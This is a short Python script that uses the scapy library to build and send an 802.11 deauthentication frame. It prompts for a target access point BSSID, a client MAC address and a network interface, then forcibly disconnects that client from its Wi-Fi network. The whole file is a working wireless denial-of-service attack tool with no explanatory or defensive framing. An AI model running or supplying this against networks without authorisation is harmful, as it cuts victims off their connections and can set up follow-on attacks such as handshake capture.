from scapy.all import *


bssid = input('type bssid : ')
client = input('clinet mac : ')
net_interface = input('net workinterface : ')

deauth = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth()
sendp(deauth, iface=net_interface)
